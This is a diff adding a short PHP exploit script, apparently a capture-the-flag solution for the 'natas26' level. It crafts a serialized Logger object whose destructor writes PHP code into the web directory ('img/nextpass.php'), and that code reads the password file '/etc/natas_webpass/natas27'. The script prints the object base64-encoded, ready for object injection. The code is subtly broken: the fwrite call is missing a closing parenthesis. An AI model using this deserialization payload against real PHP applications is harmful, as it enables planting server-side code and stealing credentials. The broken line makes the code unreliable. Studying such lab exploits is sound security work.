@@ -1,0 +1,24 @@
+<?php
+    class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+
+        function __construct(){
+            $this->initMsg="";
+            $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27') ?>";
+            $this->logFile = 'img/nextpass.php';
+        }
+
+        function __destruct()
+        {
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd, $this->exitMsg;
+            fclose($fd);
+        }
+    }
+
+    $obj = new Logger();
+    echo base64_encode(serialize($obj));
+
+?>
